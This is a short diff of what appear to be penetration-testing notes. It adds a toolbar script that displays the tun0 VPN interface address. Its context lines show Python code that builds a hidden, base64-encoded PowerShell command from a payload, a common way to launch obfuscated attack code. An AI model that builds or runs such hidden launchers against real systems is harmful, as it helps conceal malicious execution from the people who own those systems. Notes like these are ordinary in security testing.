@@ -85,3 +85,18 @@ cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')
 print(cmd)
 
 ```
+
+
+### Show Tun0 IP Toolbar
+
+```
+Generic Monitor -> Properties
+
+/opt/showtun0ip.sh
+
+---
+ADDR=$(ip addr | grep tun0|grep inet|awk '{print $2}'|cut -d "/" -f 1)
+echo "$ADDR" | sed 's/$/ /g'
+
+
+```
